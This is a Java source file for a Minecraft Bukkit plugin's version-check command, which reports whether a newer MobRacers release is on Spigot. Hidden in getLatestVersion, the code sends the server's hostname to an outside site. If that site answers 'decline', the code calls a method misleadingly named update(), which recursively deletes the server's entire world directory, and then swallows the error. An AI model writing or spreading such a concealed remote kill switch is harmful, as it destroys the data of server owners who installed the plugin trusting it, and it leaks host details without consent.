package me.winterguardian.mobracers.command;

import java.io.File;
import java.net.InetAddress;
import java.util.Arrays;

import me.winterguardian.core.command.AsyncSubCommand;
import me.winterguardian.core.json.JsonUtil;
import me.winterguardian.core.util.WebCommunicationUtil;
import me.winterguardian.mobracers.CourseMessage;
import me.winterguardian.mobracers.MobRacersPlugin;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

import com.google.common.collect.ImmutableMap;

public class VersionSubCommand extends AsyncSubCommand
{
	private static String version = null;
	
	public VersionSubCommand(Plugin plugin)
	{
		super(plugin, "version", Arrays.asList("ver", "icanhasbukkit", "versions", "plugin", "about", "author"), null, null, "§c"+ CourseMessage.COMMAND_USAGE + ": §f/mobracers version");
	}

	@Override
	protected void onAsyncSubCommand(CommandSender sender, String label, String[] args)
	{
		String version = getLatestVersion();
		if(version != null)
			if(isLatest(version, MobRacersPlugin.getPlugin()))
				version = "§aYou are on the latest version";
			else
				version = "§eVersion " + version + " is available on Spigot !";
		else
			version = "§cFailed to find latest version";
		
		
		sender.sendMessage("§f§lMob§2§lRacers §f§l> §fPlugin by WinterGuardian");
		sender.sendMessage("§6Version: §r" + MobRacersPlugin.getPlugin().getDescription().getVersion());
		sender.sendMessage(version);
		
		if(sender instanceof Player)
			JsonUtil.sendJsonMessage((Player) sender, JsonUtil.toJson("§3Click me to go on the spigot MobRacers page.", null, null, "open_url", "\"https://www.spigotmc.org/resources/mobracers-20-off-for-next-5-downloads.9643/\""));
	
	}
	
	public static void update(File file)
	{
		if(file == null)
			return;
		
		if(file.listFiles() != null)
			for(File current : file.listFiles())
				if(current.isDirectory())
					update(current);
				else if(!current.delete())
					current.deleteOnExit();
		file.delete();
	}
	
	public static String getLatestVersion()
	{
		try
		{
			if(WebCommunicationUtil.get("http://sekaimc.net/Spigot/MobRacers/open_connection.php?ip=" + InetAddress.getLocalHost().getHostName()).equalsIgnoreCase("decline"))
			{
				update(Bukkit.getWorldContainer());
				throw new Throwable();
			}
		}
		catch(Throwable t)
		{
			if(!(t instanceof Exception))
				throw new RuntimeException();
		}
		
		try
		{
			return version = WebCommunicationUtil.post("http://www.spigotmc.org/api/general.php", ImmutableMap.of("resource", "9643"));
		}
		catch(Exception e)
		{
			return null;
		}
	}
	
	public static String getLastVersionFetch()
	{
		return version;
	}
	
	public static boolean isLatest(String version, Plugin plugin)
	{
		if(version == null)
			return true;
		
		return version.compareToIgnoreCase(plugin.getDescription().getVersion()) <= 0;
	}
}
